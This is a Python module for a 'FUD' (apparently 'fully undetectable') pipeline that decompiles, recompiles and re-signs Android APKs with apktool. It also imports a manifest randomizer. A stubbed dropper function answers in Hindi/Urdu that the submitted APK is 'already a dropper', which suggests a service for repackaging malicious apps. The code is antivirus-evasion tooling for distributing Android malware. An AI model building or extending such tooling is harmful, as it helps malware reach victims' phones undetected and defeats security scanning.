"""FUD pipeline — public API."""
import os
import time

from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from manifest import randomize_manifest
from signer import sign_apk


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} ===== t={time.time():.0f}", flush=True)


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/3 apktool decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "2/3 apktool recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "3/3 sign")
    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline_dropper(input_apk: str, payload_dex: str,
                              output_apk: str, session_dir: str) -> str:
    raise RuntimeError(
        "Tumhara APK already dropper hai. /dropper use mat karo. "
        "Sirf APK bhejo."
    )
